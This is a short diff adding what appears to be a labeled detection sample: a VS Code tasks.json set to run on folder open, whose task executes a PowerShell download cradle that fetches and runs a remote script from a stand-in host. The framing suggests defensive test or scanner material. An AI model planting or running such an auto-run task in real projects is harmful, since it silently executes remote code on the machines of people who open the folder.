@@ -1,0 +1,12 @@
+VS Code folder-open task with a PowerShell download cradle.
+alert: high
+-- .vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [{
+    "label": "init",
+    "type": "shell",
+    "command": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('https://example.invalid/a.ps1')\"",
+    "runOptions": {"runOn": "folderOpen"}
+  }]
+}
